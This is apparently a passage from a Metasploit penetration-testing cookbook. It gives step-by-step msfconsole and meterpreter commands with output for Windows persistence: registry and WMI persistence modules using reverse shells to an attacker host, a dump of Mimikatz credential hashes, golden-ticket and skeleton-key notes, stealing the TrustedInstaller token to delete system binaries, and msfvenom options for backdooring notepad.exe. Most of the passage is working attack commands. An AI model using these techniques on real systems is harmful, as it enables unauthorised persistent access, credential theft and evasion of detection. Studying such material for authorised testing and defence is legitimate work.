
```
Logon Server      : VAGRANT-2008R2
Logon Time        : 11/25/2017 10:19:08 AM
SID               : S-1-5-21-653170132-1988196614
                  -1572848168-1000

msv :
  [00000003] Primary
  * Username : vagrant
  * Domain   : VAGRANT-2008R2
  * LM       : 5229b7f52540641daad3b435b51404ee
  * NTLM     : e02bc503339d51f71d913c245d35b50b\
  * SHA1     : c805f88436bcd9ff534ee86c59ed23
                0437505ecf
...
```

## There's more...

Golden Tickets and Mimikatz: Using Mimikatz, we can use the password information for the KRBTGT account to create forged Kerberos tickets (TGTs) that can then be used to request TGS tickets for any service on any computer in the domain.

Another one of my favorite features is the ability to use Mimikatz to implant skeleton keys using the misc module with the skeleton command, which will patch LSASS to enable the use of a master password for any valid domain user.

## Setting up a persistence with backdoors

In this recipe, we will learn how to establish a persistent connection with our target, allowing us to connect to it at our will. As the attacker, we want to ensure we have access to our target no matter what and backdooring the target can be effective for setting persistent connections.

### Getting ready

Metasploit has several persistence modules available. In this recipe, we will have a look at some local and post-exploitation modules that we can use to establish persistence on the target machine.

### How to do it...

1. The first module we will try is the Windows Registry Only Persistence exploit module. This module will install the complete payload in the registry, which will be executed during booting up:

```
msf exploit(psexec) > use exploit/windows/local/
registry_persistence
msf exploit(registry_persistence) > set SESSION 1
SESSION => 1
msf exploit(registry_persistence) > set STARTUP SYSTEM
STARTUP => SYSTEM
msf exploit(registry_persistence) > set PAYLOAD
windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
msf exploit(registry_persistence) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(registry_persistence) > set LPORT 443
LPORT => 443
msf exploit(registry_persistence) > exploit
...
[*] Clean up Meterpreter RC file: /root/.msf4
/logs/persistence/192.168.216.10_20171126.2103
/192.168.216.10_20171126.2103.rc
msf exploit(registry_persistence) >
```

Now we just need to set up a listener and wait for the target machine to reboot.

2. Another persistence module we will use is the WMI Event Subscription Persistence local exploit module:

```
meterpreter > migrate -N explorer.exe
[*] Migrating from 5280 to 5672...
[*] Migration completed successfully.
meterpreter > background
[*] Backgrounding session 1...
msf exploit(psexec) > use exploit/windows/local/
wmi_persistence
set SESSION 1
SESSION => 1
msf exploit(wmi_persistence) > set PAYLOAD
windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(wmi_persistence) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(wmi_persistence) > set LPORT 443
LPORT => 443
[*] Installing Persistence...
[+] - Bytes remaining: 12260
[+] - Bytes remaining: 4260
[+] Payload successfully staged.
[+] Persistence installed! Call a shell using
"smbclient \\\\192.168.216.10\\C$ -U BOB
<arbitrary password>"
[*] Clean up Meterpreter RC file: /root/.msf4
/logs/wmi_persistence/192.168.216.10_20171127.1028
/192.168.216.10_20171127.1028.rc
msf exploit(wmi_persistence) >
```

3. With our persistence in place, we need to start a listener using the Generic Payload Handler module:

```
msf exploit(wmi_persistence) > use exploit
/multi/handler
msf exploit(handler) > set PAYLOAD windows
/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.216.5:443
```

4. To get a session back, we need to generate an event ID 4625 (an account failed to log on) with the username BOB, which will trigger the payload. For that, we will use the smbclient command:

```
root@kali:~# smbclient \\\\192.168.216.10\\C$
-U BOB BLA
WARNING: The "syslog" option is deprecated
session setup failed: NT_STATUS_LOGON_FAILURE
root@kali:~#
```

5. Back in the msfconsole, we should receive a new Meterpreter session:

```
[*] Sending stage (179267 bytes) to 192.168.216.10
[*] Meterpreter session 2 opened (192.168.216.5:443 -> 192.168.216.10:50036) at 2017-11-27 16:11:29 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

## Becoming TrustedInstaller

Another way to gain persistence is to backdoor a service binary. So, let's try to backdoor a Windows binary in the Windows 10 target machine.

### How to do it...

- 1. First, we will download notepad.exe to our Kali machine using the download command:

```
meterpreter > pwd
C:\Windows\system32
meterpreter > download notepad.exe
[*] Downloading: notepad.exe -> notepad.exe
[*] Downloaded 227.00 KiB of 227.00 KiB (100.0%):
notepad.exe -> notepad.exe
[*] download : notepad.exe -> notepad.exe
meterpreter >
```

Use the pwd command to make sure you are on the C:\Windows\system32 directory where notepad.exe is located. If not, use the cd command to change to the proper directory (don't forget to use double backslashes):
C:\\Windows\\system32.

![](img/6b6e557533100c0e47951d0e5e14c4ee_570_0.png)

2. Now that we have a copy of the binary, let's try to remove the original:

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > rm notepad.exe
[-] stdapi_fs_delete_file: Operation failed:
Access is denied.
meterpreter >
```

As you can see, although we are running with system privileges, we are unable to delete the original file. This happens because of TrustedInstaller, a Windows Module Installer service which is part of Windows Resource Protection. This restricts access to certain core system files, folders, and registry keys that are part of the Windows OS.

3. So, before we can backdoor the service, we need to remove the original file. For that, we will use the steal_token Meterpreter command to steal the authentication token and gain the privileges of TrustedInstaller. First, we will start the TrustedInstaller service:

```
meterpreter > shell
Process 4836 created.
Channel 2 created.
Microsoft Windows [Version 10.0.10586]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>sc start TrustedInstaller
sc start TrustedInstaller
...
IGNORES_SHUTDOWN)
    WIN32_EXIT_CODE : 0 (0x0)
    SERVICE_EXIT_CODE : 0 (0x0)
    CHECKPOINT : 0x0
    WAIT_HINT : 0x7d0
    PID : 3420
    FLAGS :

C:\Windows\system32>
```

4. With the service up and running, we can use the ps command to get the PID of the TrustedInstaller, use the steal_token followed by the PID to steal the token, and finally remove the original notepad.exe file:

```
meterpreter > ps TrustedInstaller
Filtering on 'TrustedInstaller'

Process List
-------------
```

| PID | PPID | Name | Arch | Session | User | Path |
|---|---|---|---|---|---|---|
| 3420 | 728 | TrustedInstaller.exe | x86 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\servicing\TrustedInstaller.exe |

```
meterpreter > steal_token 3420
Stolen token with username: NT AUTHORITY\SYSTEM
meterpreter > rm notepad.exe
meterpreter >
```

Great! Now that we have successfully removed the binary, let's move on to the next recipe and see how we can backdoor it.

## Backdooring Windows binaries

By backdooring system binaries, we can ensure that we will have persistence in the target machine, and we won't trigger alarms by adding new registry entries or new binaries to the system.

### How to do it...

- 1. We will use msfvenom to backdoor the notepad.exe binary:
  - Use -a for the architecture, in this case, x86
  - --platform for the platform of the payload Windows
  - -p, for the payload to use
    windows/meterpreter/reverse_tcp, LHOST followed by the IP address of our Kali machine
  - -x to specify a custom executable file to use as a template; in this recipe, we will use notepad.exe
  - -k to preserve the template behavior and inject the payload as a new thread
  - -f for the output format
